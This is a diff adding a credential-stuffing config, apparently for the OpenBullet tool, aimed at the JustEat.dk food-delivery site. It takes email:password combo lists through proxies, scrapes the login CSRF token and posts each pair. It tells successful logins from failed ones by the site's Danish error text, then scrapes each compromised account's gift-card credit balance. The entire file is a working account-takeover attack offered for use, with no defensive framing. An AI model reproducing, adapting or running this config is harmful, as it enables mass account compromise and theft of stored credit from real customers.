@@ -1,0 +1,61 @@
+[SETTINGS]
+{
+  "Name": "JustEat.dk - Giftcard Balance Capture",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-19T17:13:10.4163025+02:00",
+  "AdditionalInfo": "",
+  "Author": "fort#4830",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.just-eat.dk/account/login/?returnUrl=/area/2200-københavn-n/" 
+  CONTENT "__RequestVerificationToken=<Token>&Email=<USER>&Password=<PASS>&RememberMe=true&RememberMe=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<SOURCE>" LR "hidden\" value=\"" "\" />" -> VAR "Token" 
+
+#Login REQUEST POST "https://www.just-eat.dk/account/login/?returnUrl=/area/2200-københavn-n/" 
+  CONTENT "__RequestVerificationToken=<Token>&Email=<USER>&Password=<PASS>&RememberMe=false&RememberMe=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#W_or_L KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"header|click - navigation|logout\"" 
+  KEYCHAIN Failure OR 
+    KEY "<li>Beklager, vi kunne ikke logge dig ind. Angiv venligst dine detaljer igen eller" 
+    KEY "Angiv venligst dine detaljer igen" 
+
+REQUEST GET "https://www.just-eat.dk/account/credit/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#giftcard_capture PARSE "<SOURCE>" LR "<span id=\"account-credit-balance\" class=\"u-text-highlight\">" "</span></h2>" -> CAP "Balance" 
+
